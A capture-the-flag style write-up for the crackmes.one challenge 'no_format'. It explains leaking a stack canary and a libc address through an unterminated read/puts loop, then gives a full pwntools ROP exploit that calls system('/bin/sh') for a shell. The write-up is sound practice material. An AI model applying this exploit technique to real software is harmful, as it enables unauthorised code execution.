# Solution to [BitFriends's no_format](https://crackmes.one/crackme/5f737a1c33c5d4357b3b0355)

To begin, it's important to understand the structure of the stack, which typically resembles this:

[0xffffffffffffffff] Top of the stack

[libc ret address] 8 bytes
[libc         rbp] 8 bytes
[     canary     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes
[     buffer     ] 8 bytes

[0x0000000000000000] Bottom of the stack

Additionally, the decompiled binary appears to be structured as follows:

```c

undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  do {
    memset(local_58,0,0x40);
    read(0,local_58,0x280);
    puts(local_58);
    iVar1 = strcmp(local_58,"exit\n");
  } while (iVar1 != 0);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

After examining the canary and the libc return address in GDB, it was observed that the first byte of the canary is typically `\x00`. By overriding the first byte of the canary, it becomes possible to leak the canary value by sending 73 bytes of data and then reading the output. Similarly, the libc return address can be leaked by sending 88 bytes of data (72 bytes for the buffer, 8 bytes for the canary, and 8 bytes for the pushed `$rbp`). Upon inspecting the return address in libc, it was found to correspond to something named `__libc_start_call_main`, differing by `0x26fe0` from the system function. Therefore, the following code was utilized to update the libc address:

```python
difference = (libc_ret+0x26fe0) - (libc.functions['system'].address) # libc_ret+0x26fe0 is the offset of system in libc
libc.address += difference
```

We're nearly there! Now, to achieve our goal of obtaining a shell, we need to construct a Return-Oriented Programming (ROP) chain. However, we must account for one last detail: stack alignment. To ensure proper alignment, we'll include a return address in the ROP chain. Once this is in place, we can enjoy our shell :)

Feel free to incorporate print statements or use GDB to delve deeper into the stack, canary, and libc! Happy hacking!

```python
from pwn import *
import pwnlib.gdb


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(libc)
p = process('./no_format')

# # for debugging
# p = pwnlib.gdb.debug('./no_format', '''
# layout asm
# b *main
# b *main+40
# b *main+125
# continue
# ''')

# function to read n lines
def read_line(i, decode = True):
    for _ in range(i):
        line =	p.recvline()
    if decode:
        return line.decode('utf-8', errors='replace')
    return line

# leak canary
payload = 72 * b'A' + b'A' 
p.send(payload)
canary = b'\x00' + read_line(1, False)[73:80]

# rbp
rbp = p64(1)


# leak libc ret address
payload = 72 * b'A' + b'B' * 8 + b'C' * 8 
p.send(payload)
libc_ret = read_line(1,False)[88:-1]
libc_ret = int.from_bytes(libc_ret, byteorder='little')

# calculate libc base address
difference = (libc_ret+0x26fe0) - (libc.functions['system'].address) # libc_ret+0x26fe0 is the offset of system in libc
libc.address += difference

# system (ROP)
system = libc.functions['system'].address
binsh = next(libc.search(b'/bin/sh\x00'))
payload = 72 * b'A' + canary + rbp + p64(rop.rdi[0]+difference) + p64(binsh) + p64(rop.ret.address+difference) + p64(system)
p.send(payload)
print(read_line(1))

p.send("exit\n")
print("Shell: ")

p.interactive()
```